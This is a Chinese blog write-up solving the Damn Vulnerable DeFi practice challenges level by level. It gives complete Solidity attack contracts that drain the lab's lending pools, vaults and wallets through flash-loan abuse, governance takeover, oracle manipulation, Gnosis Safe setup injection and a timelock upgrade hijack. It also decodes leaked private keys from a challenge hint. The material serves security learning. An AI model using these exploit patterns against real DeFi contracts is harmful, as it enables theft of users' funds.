记录下这个靶场的刷题。这个靶场需要js基础，最好先去把js语法看一看。

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/12840c7a0cdf41809aeacc8b69d214c8~tplv-k3u1fbpfcp-watermark.image?)
# 1.unstoppable
题目要求：攻击目标合约让他停止工作。
UnstoppableLender合约就是一个闪电贷合约，ReceiverUnstoppable合约就是借钱者合约。

想要闪电贷合约停止工作很简单，直接找会panic的地方。在flashLoan函数里有一句`assert(poolBalance == balanceBefore);`所以我们只要让他们两不相等就行。

只要不通过depositTokens函数给合约传钱就可以让poolbalance与合约余额不相等，因为初始化我们拥有100个ether，所以直接transfer 1ether给他就可以。

## 攻击代码：

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2199ad444ff2471fa387d8148a39a6f5~tplv-k3u1fbpfcp-watermark.image?)

# 2.Naive receiver
题目要求：抽空用户合约里的所有eth。
目前闪电合约里有1000ETH,用户合约有10ETH.

这次的贷款合约每次借款都会收取1 ETH的费用，而且flashLoan函数不是以msg.sender去借款而是borrower去借款，那么我们就可以帮用户合约借10款目的就达到了。

## 攻击代码：

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7c2a3ece0a8f4c72a095017dfadeae83~tplv-k3u1fbpfcp-watermark.image?)


# 3.Truster
题目要求：拿走贷款合约里的所有钱.  
很明显考的是call注入，data里调用approve给攻击者地址授权，然后再用transferfrom将钱转过来.

## 攻击代码：

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f57d884ac8634c20961a65092fa1a68d~tplv-k3u1fbpfcp-watermark.image?)

# 4. Side entrance
题目要求：清空贷款合约的钱

这次合约新增了`deposit`和`withdraw`函数，可以在合约里存钱取钱。当然咯，问题也出在这里的，我们可以先借再存再取回，就绕过了`require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back"); `这个限制。

## 攻击代码
**攻击合约**
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
contract attack{
     using Address for address payable;
   SideEntranceLenderPool pool;
constructor(address Ipool)public{
    pool=SideEntranceLenderPool(Ipool);
}
function att1()public{
    pool.flashLoan(address(pool).balance);
    pool.withdraw();
    payable(msg.sender).transfer(address(this).balance);
} 
function execute() external payable{
     pool.deposit{value:address(this).balance}();
    
}
receive ()external payable{

}

}
```

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b6827120cb5c47109142bcc9419826d4~tplv-k3u1fbpfcp-watermark.image?)

(记得部署attack合约，我刚开始没注意，部署到js代码上半部分不需要改动的地方了。）
# 5 The rewarder
题目要求：我获得全部的奖励token并且其他人不能获得收益。

合约会每五天根据用户token余额来发放奖励，奖励的额度和池中全部的token数目和用户存入的token有关。

**前三个合约介绍：**
-   `AccountingToken`：继承了 `openzeppelin` 的 `ERC20Snapshot` 模版的 `ERC20` 代币，提供代币快照功能。该合约在游戏中用于记录用户在某个快照之内充值的代币数量。
-   `FlashLoanerPool`：一个提供 `DVT` 代币的闪电贷池。
-   `RewardToken`：标准 `ERC20` 代币，在该游戏中用于提供给用户代币奖励。

TheRewardPool里面有三种token，`liquidityToken`是真正的token,`accToken`是进行逻辑运算的token,`rewardToken`就是奖励。  
deposit方法就是存钱，然后会根据你的时间节点判断给不给奖励，
但是由于我们是第一次存钱所以_hasRetrievedReward天然返回false,isNewRewardsRound我们要去设立满足5天即可。

初始合约有1000000代币，爱丽丝、鲍勃、查理和大卫一人存了100代币进去
。
他的奖励计算方式：
 rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
 
 如果amountDeposited占比特别大，那么就可以获得所有的奖励，并且其他人奖励为0.  
 然后我们利用上一题漏洞，先把合约全部钱借走，然后用这个钱deposit，再还回去。我们就能拿到所有的奖励了。
 
## 攻击代码：
**攻击合约：**
 ```
 // SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";

contract attack2{
    DamnValuableToken liquidToken;
    FlashLoanerPool flashpool;
    RewardToken     rewardToken;
    TheRewarderPool theRewarderPool;
    constructor (address acc,address flpool,address retoken,address therepool)public{
     liquidToken= DamnValuableToken(acc); 
     flashpool=FlashLoanerPool(flpool);
     rewardToken=RewardToken(retoken);
     theRewarderPool=TheRewarderPool(therepool);
    }
    function att()public{
      uint256 amount= liquidToken.balanceOf(address(flashpool));
      flashpool.flashLoan(amount);
      rewardToken.transfer(msg.sender,rewardToken.balanceOf(address(this)));
    }
    function receiveFlashLoan(uint256 amount)public payable{
      liquidToken.approve(address(theRewarderPool),amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
       liquidToken.transfer(address(flashpool),amount);
    }
    fallback()external payable{

    }

}
```

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/43d75b25f4a54862bb4267a08f978b62~tplv-k3u1fbpfcp-watermark.image?)
 
# 6.selfie
题目要求：拿到池内所有的1.5million token

这个题有一个drainAllFunds函数，只要是Governance 就可以提走合约里的所有钱。然后我们去看一下SimpleGovernance合约，他有一个queueAction函数可以传入data构造数据，executeAction执行。  
那么我们可以在data里执行drainAllFunds函数，攻击就成功了

还需要做的一件事情就是满足queueAction的条件，我们可以通过借钱满足`_hasEnoughVotes`，然后构造好特定 data 后传入 `queueAction()` 函数，然后归还贷款，最后执行 `executeAction()` 函数。

## 攻击代码
**攻击合约：**
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableTokenSnapshot.sol";

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
contract attack3{
   SimpleGovernance public governance;
   SelfiePool public pool;
   DamnValuableTokenSnapshot public token;
   uint256 public actionId;
   address public owner;
   constructor(address _governance,address payable _pool,address _token,address _attacker)public{
       governance = SimpleGovernance(_governance);
       pool =SelfiePool(_pool);
       token=DamnValuableTokenSnapshot(_token);
      owner=_attacker;
   }
   function attack()public{
       pool.flashLoan(token.balanceOf(address(pool)));
    
      
   }
   function receiveTokens(address addrtoken,uint256 amount)public{
     token.snapshot();
     bytes memory data=abi.encodeWithSignature("drainAllFunds(address)", owner);
    actionId= governance.queueAction(address(pool), data, 0);
     token.transfer(address(pool),amount);

   }
   function fian()public {
     governance.executeAction(actionId);
     
   }

}
```

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6481514be6ed4065ba463a93321c6886~tplv-k3u1fbpfcp-watermark.image?)

# 7 - Compromised
题目要求：偷走所有可用的ETH

这个题主要是NFT的发行售卖定价，我们可以通过js文件知道，题目初始有三个合伙人（sources),每一个人对`DVNFT`的出价为999 eth，我们初始有0.1 ETH.

看exchange合约，NFT购买和出售的价格都是根据` uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());` getMedianPrice又是根据合伙人出价的中间价来确定的。想要修改出价的话就只有调用postPrice函数。

但是调用postPrice前提是合伙人，那我们怎么能成为合伙人呢？回看题目给的提示，

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/69687c542c31457086c2b77e48c8270d~tplv-k3u1fbpfcp-watermark.image?)

那两串数字就是两个sources的私钥.有了私钥就可以控制source.

以 Base64 解码 16 进制数据
```
const Web3=require('web3');
const web3=new Web3();
const binary = '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35';

 const text = web3.utils.hexToAscii('0x' + binary.replace(/[ ]+/g, ''))
 console.log(text)
'MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5'

 const decoded = Buffer.from(text, "base64").toString()
 console.log(decoded)
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
```
得到两个私钥：
> 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9  
> 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

## 攻击代码：

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/03177402c74e4e4188cefee69b35c7bd~tplv-k3u1fbpfcp-watermark.image?)

# 8  Puppet
题目要求：偷走所有的token

这个题只有一个核心函数borrow(),代币交换最主要的逻辑在_computeOraclePrice里面，可以发现 `computeOraclePrice()` 计算过程存在着一定问题，如果 `uniswapOracle.balance * (10 ** 18) < token.balanceOf(uniswapOracle)`，那么得到的结果其实是 0。

第一个思路：直接把我们的DVT token 全部转给`uniswapPair`，but不行。原因：分母* (10 ** 18)，相当于给小数预留了位置，转过去的钱不够大

第二个思路：用uniswap里的`ethToTokenSwapInput`方法，与用eth换DVT，这样他分母减小，分子增大。这样能够拥有最小值，但也不能使他为0
> uniswap v1相关接口和说明：[DeFi发展史：Uniswap V1 源码阅读和分析 | Hexo (iondex.github.io)](https://iondex.github.io/2021/07/13/uniswap-v1-source-code/)

## 攻击代码：

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9bcac69c48634bdaa59d23b05a494134~tplv-k3u1fbpfcp-watermark.image?)

# 9 Puppet v2
题目要求：拿走所有的token

老规矩先了解uniswap v2:
> uniswap v2概述
> https://uniswap.org/blog/uniswap-v2
> 
> uniswap v2 core源码解析系列
> https://github.com/bengda233/bengda233.github.io/new/main/uniswap

看PuppetV2Pool代码，核心在_getOracleQuote上，我们去看uniswap源码：

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0af054d05fe64dafa213f752519d32e7~tplv-k3u1fbpfcp-watermark.image?)

getReserves函数是得到该token的余额。  
 amountB = amountA.mul(reserveB) / reserveA;
 
 同样，我们让reserveB/reserveA的比例变小，就可以达到目的了。
 
先给uniswap 授权，然后用token换ETH，然后去WETH中存钱，用WETH去与pool借钱。
![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fdccf015754a41ad8afe6bf120eaf51a~tplv-k3u1fbpfcp-watermark.image?)

# 10  Free rider
题目要求：拿到45ether奖励、买走所有的NFT。

此题逻辑问题出在_buyOne函数上，可以将6 NFT全部买完而支付一个NFT的钱。因为将NFT转给我们之后，又把钱转给了NFT拥有者（也就是我们），相当于我们没花钱就买到NFT了。
不过我们的钱包里只有 0.5 ETH，我们如何获得至少 15 ETH 只是为了购买，将它们转移给买家并获得我们的赏金？

 看一下js文件，发现允许用uniswap v2，uniswap v2提供闪电贷功能，但是必须以0.3%的费用偿还我们借出的交易金额。
 
## 攻击步骤：
 1.创建一个攻击合约，向uniswap借15ETH  
 2.购买所有NFT  
 3.将NFT发送到FreeRiderBuyer，合约会转回给我们45ETH  
 4.给uniswap还钱
 5.自毁合约，将剩的ETH 发回给攻击者。
 
## 攻击代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
    function token() external returns (IERC721);
}


interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}
interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract attack4{
IUniswapV2Pair immutable  uniswapPair;
address immutable attacker;
IFreeRiderNFTMarketplace immutable nftplace;
IERC721 immutable nft;
address immutable buyer;
IWETH immutable weth;
constructor(IUniswapV2Pair _uniswapPair,IFreeRiderNFTMarketplace _nftplace,IWETH _weth,address _buyer){
    attacker=msg.sender;
    uniswapPair=_uniswapPair;
    nftplace=_nftplace;
    weth=_weth;
    nft=_nftplace.token();
    buyer=_buyer;
}

 function flashSwap()external{
   uniswapPair.swap(15 ether,0,address(this),hex"00");
 }
 function uniswapV2Call(address, uint, uint, bytes calldata)public {
    weth.withdraw(15 ether);
    uint256[] memory tokenIds= new uint256[](6);
    tokenIds[0]=0;
    tokenIds[1]=1;
    tokenIds[2]=2;
    tokenIds[3]=3;
    tokenIds[4]=4;
    tokenIds[5]=5;
 nftplace.buyMany{value:15 ether}(tokenIds);

for(uint8 tokenId=0;tokenId<6;tokenId++){
    nft.safeTransferFrom(address(this),buyer,tokenId);
}
//计算还钱金额
uint256 fee=((15 ether*3)/uint256(997))+1;
weth.deposit{value:15 ether+fee}();
weth.transfer(address(uniswapPair), 15 ether+fee);

payable(address(attacker)).transfer(address(this).balance);
 }
fallback() external payable{

}
function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4){
    return IERC721Receiver.onERC721Received.selector;
}

}
```
# 11  Backdoor
题目要求：从注册表中取出所有资金

这个题涉及到代理合约，去看js文件我们可以发现部署了*GnosisSafe，GnosisSafeProxyFactory*，*GnosisSafe*safe是包含钱包得实际业务逻辑合约。*GnosisSafeProxyFactory*是一个可以生产*克隆的GnosisSafe*的合同。因为不需要重新部署整个业务逻辑，因此很便宜。

写这个题之前必须得去看*GnosisSafe，GnosisSafeProxyFactory*，两个合约，来看`createProxyWithCallback`函数，这个函数就是允许创建多个钱包的函数。注意看里面有一个initializer变量，会进 `createProxyWithNonce`函数进行call调用。  
然而initializer变量要求传入setup函数（GnosisSafe里）：

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9c7daf5e71074f29a5dcc4cfcef5b2e1~tplv-k3u1fbpfcp-watermark.image?)

再去看setup,setup有to和data两个变量，如果data是我们构造的approve函数，to是我们的地址，我们就能让代理合约给我们授权，就可以把他们的钱转走。

这个题的时机卡的特别准，关键点就是因为他们还没有创建代理合约，可以做手脚

## 攻击代码：
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import  "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
contract attack5{
   GnosisSafeProxyFactory public factory;
   IProxyCreationCallback public callback;
   address[] public users;
   address public singleton;
   address token;
   constructor (address _factory,address _callback,address[] memory _users,address _singleton,address _token)public {
    factory=GnosisSafeProxyFactory(_factory);
    callback=IProxyCreationCallback(_callback);
    users=_users;
    singleton=_singleton;
    token=_token;
           }
    function approve(address _token,address spender)public{
        IERC20(_token).approve(spender,10 ether);
    }
    function attack()public {
        bytes memory data=abi.encodeWithSignature("approve(address,address)",token,address(this));
        for(uint256 i=0;i<users.length;i++){
            address[] memory owners=new address[](1);
            owners[0]=users[i];
           bytes memory initializer=abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
                                    owners,
                                    1,
                                    address(this),
                                    data,
                                   address(0),
                                   address(0),
                                     0,
                                   address(0)
           );
           GnosisSafeProxy proxy=factory.createProxyWithCallback(singleton,initializer,0,callback);
           IERC20(token).transferFrom(address(proxy),tx.origin,10 ether);
        }
       
    }

}
```


![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/eba895c2166b4417955840fcb1dcfe91~tplv-k3u1fbpfcp-watermark.image?)


# 12 Climber
题目要求：清空保管库。

`climbervault`将所属权给了`climbertimelock`，要拿走他的钱得执行sweepFunds方法，然而我们又没有 onlySweeper的身份，不过`climbervault`又可以进行合约升级，那么将他进行升级重写改方法不就可以了。  

想要升级`climbervault`，得转战ClimberTimelock，我们发现只要又PROPOSER_ROLE的身份就可以进行提案，然后执行。同时我们要让delay变为0.

攻击步骤:  
1.让delay变为0  
2.给攻击合约proposer权限  
3.升级climbervalut合约覆盖掉sweepfunds方法  
4.执行sweepfunds把钱拿过来

但是在execute之前得让他们schedule
## 攻击代码：
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./ClimberTimelock.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ClimberVault.sol";
contract attack6 is UUPSUpgradeable{
         ClimberTimelock  immutable timelock;
         address immutable vaultProxyAddress;
         IERC20 immutable token;
         address immutable attacker;
constructor(ClimberTimelock _timelock,address _vaultProxyAddress,IERC20 _token){
    timelock=_timelock;
     vaultProxyAddress = _vaultProxyAddress;
        token = _token;
        attacker = msg.sender;
}
function buildProposal() internal returns(address[]memory,uint256[]memory,bytes[]memory){
      address[] memory targets= new address[](5);
        uint256[] memory values =new uint256[](5);
        bytes[] memory dataElements=new bytes[](5);

        //升级delay为0
        targets[0]=address(timelock);
        values[0]=0;
        dataElements[0]=abi.encodeWithSelector(ClimberTimelock.updateDelay.selector,0);

        //给合约proposer角色
        targets[1]=address(timelock);
        values[1]=0;
        dataElements[1]=abi.encodeWithSelector(AccessControl.grantRole.selector,timelock.PROPOSER_ROLE(),address(this));

        //进行schedule
        targets[2]=address(this);
        values[2]=0;
            dataElements[2] = abi.encodeWithSelector(
            attack6.scheduleProposal.selector
        );

        //升级climbervault,替换掉里面sweepFunds函数
        targets[3]=address(vaultProxyAddress);
        values[3]=0;
        dataElements[3]=abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector,address(this));
        
        //把钱换过来
        targets[4]=address(vaultProxyAddress);
        values[4]=0;
        dataElements[4]=abi.encodeWithSelector(attack6.sweepFunds.selector);
       
       return (targets,values,dataElements);

}


       function scheduleProposal()external {
            (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
         timelock.schedule(targets, values, dataElements, 0);

       }

       function executeProposal() external {
         (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
         timelock.execute(targets, values, dataElements, 0);
       }
       function sweepFunds()external {
        token.transfer(attacker,token.balanceOf(address(this)));
       }

           function _authorizeUpgrade(address newImplementation) internal  override {}
       
}
```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b96c4f31fd1c4ee7a0111f5649539755~tplv-k3u1fbpfcp-watermark.image?)


# 13 Safe miners
通关要求：拿走所有的钱  
这个题很有趣，有人把发送到了一个空地址，实际上只是将token转移到一个没有任何内容的地址,那么我们怎么样能把钱截胡呢

不知道大家了不了解create2,也许我们可以以某种方式使用[*create2*](https://www.youtube.com/watch?v=883-koWrsO4) 生成这个地址？    
结果是不行
> 具体探索过程可看：[该死的脆弱的 DeFi V2 - #13 初级矿工 • 腹侧数字 (ventral.digital)](https://ventral.digital/posts/2022/7/2/damn-vulnerable-defi-v2-13-junior-miners)

结论是蛮力法：  
写一个将自己所有钱转给attacker的合约，然后再写一个合约for循环构造他，在js里也用for循环构造。我是两次for循环一百次也就是一共生成10000次，赌能不能生成0x79658d35aB5c38B6b988C23D02e0410A380B8D5c这个地址的合约，如果生成这关就过了，没生成就过不了

## 攻击代码：
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract JuniorMinersExploit {
    constructor(
        address attacker,
        IERC20 token,
        uint256 nonces
    ) {
        for (uint256 idx; idx < nonces; idx++) {
            new TokenSweeper(attacker, token);
        }
    }
}

contract TokenSweeper {
    constructor(
        address attacker,
        IERC20 token
    ) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0479e1f9490542fcb9c386fd8d720ec7~tplv-k3u1fbpfcp-watermark.image?)